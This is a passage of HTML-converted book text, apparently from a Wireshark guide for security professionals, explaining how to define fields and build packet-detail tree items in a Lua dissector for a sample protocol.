New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgdata = ProtoField.string("sample.msgdata",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"MsgData", "This is Message</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Data")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_addata = ProtoField.string("sample.addata",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"AddData", "This is Additional Data")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_addata_b = ProtoField.bytes("sample.addata_b", "AddData_bytes",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX, nil, nil, "This is Additional data as bytes")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add fields to our protocol sample_proto.fields = {</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >f_len_h,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  align=center  style="margin-top:0.0000pt;margin-right:71.3500pt;margin-left:6.4000pt;text-indent:0.0000pt;text-align:center;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >f_len_d,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section357" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:208.7000pt;margin-left:180.6500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >f_transid_h, f_transid_d, f_msgtype_s, f_msgtype_uh, f_msgtype_ud, f_msgdata, f_addata, f_addata_b}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:11.2500pt;margin-right:13.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The preceding code snippet shows where we define our </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoFields</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, so let&#8217;s break it down further. The first field we define is </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >f_len_h</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which is going to be our Length field of our sample protocol. After reviewing the protocol description, we know this will be 16 bits (or 2 bytes). We know that as this specifies the length of the packet in bytes that it should never be a negative number. Therefore, we define </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >f_len_h </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >as a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField.uint16</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which means the field is an unsigned 16-bit integer. This is important to note, because how you define</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >these fields determines how Wireshark attempts to interpret the bytes within each field. The function prototype for </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField.uint16 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is as follows:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:13.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField.uint16(abbr, [name], [base], [valuestring],</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[mask], [desc])</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:8.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first and only required parameter is the abbreviated field name, which also happens to be what you will use in the filter box for</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >creating filters against our new protocol. The optional name parameter is what Wireshark displays within the Packet Details pane. The base parameter is what is interesting, as it further defines how the bytes are displayed by Wireshark. In the case of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >f_len_h </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field, we are asking that Wireshark display it as hexadecimal by passing in </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >valuestring </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >parameter is an optional table that can <a name="_bookmark654" ></a>be used to match various values to a string automatically. We aren&#8217;t using this functionality within this field so we have set it to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the same for the mask parameter, which is the integer mask for the field. The final parameter is the description parameter, which can be used to describe the field in more detail. You may have noticed that we have defined a few length-related fields. This was done because it serves as a really concrete way to demonstrate the various ways Wireshark can display field data. Once we define all of our fields, we then add it to our</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Proto</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section358" ><p class=MsoBodyText  style="margin-top:3.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >by setting the field attributes to a dictionary of all the fields defined.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In the next section of code, we build the packet tree that you see within the Packet Details pane. We start by defining our protocol dissector function, which takes in a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tvb</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, or Testy Virtual Buffer </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(buf)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, that represents the packet data handled by this dissector. You can think of this buffer as almost a tuple/list/array, with the first parameter as the offset into the packet buffer, but the second actually specifies how many bytes it is in length. The second parameter to our dissector function is a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pinfo</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >object that contains various packet information and can be used to set various column values. We use this </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pinfo </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >object within our dissector function to set the protocol column to our sample protocol name (which is just &#8220;sample&#8221;). The last parameter is the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >treeitem</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, which will be how we add additional values to the Packet Details pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create our dissector</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function sample_proto.dissector (buf, pinfo, tree)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--set name as it shows up in the protocol column pinfo.cols.protocol = sample_proto.name</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now we want to add an item to the existing tree, which will be dependent on where the dissector is used. For our example protocol dissector, this tree will be added after the TCP section within the Packet Details pane. We add these items by calling </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >treeitem:add() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >by adding to the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >treeitem</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >that is passed into our dissector function with a parameter of our Proto object and the first element of our </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tvb (buf)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create the subtree object so we can add off of the Sample Protocol</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local subtree = tree:add(sample_proto, buf(0))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create a nest for just the length field</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ln_tree = subtree:add(buf(0, 2), "Length Fields")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add treeitem without using protofield ln_tree:add(buf(0, 2), "Length: " .. buf(0,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2):uint()):append_text</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >("\t[*] add without ProtoField -- uint")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--add treeitem without specifying endianess in both hex and int/decimal</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add(f_len_d, buf(0, 2)):append_text("\t[*] add with ProtoField base.DEC")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.6000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add(f_len_h, buf(0, 2)):append_text("\t[*] add with</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section359" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ProtoField base.HEX")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:8.0000pt;" ><a name="_bookmark655" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Notice that we also create another </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >treeitem </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >off of the local </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >subtree </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable. This allows us to create another branch under our protocol dissectors. The new subtree is called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Length Fields </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and allows us to add or call out several more fields. The new Length Fields subtree can be named whatever you like. Under the subtree are added several new fields, done by the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ln_tree:add() </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function. These new fields are specifically named according to the purpose they serve. This script intentionally includes just about every way possible to add</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >information to the Packet Details</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.2000pt;" ><a name="_bookmark656" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The script is well documented, and you can compare it alongside of </span><span><a href="#_bookmark657" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-9</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. See how each script line contributes to the details</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >provided in the Packet Details</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.2500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="210"  height="0" ></td></tr><tr><td></td><td><img width="600"  height="557"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker450224.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark657" ></a><span><a href="#_bookmark656" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-9:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Tree items in Wireshark</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
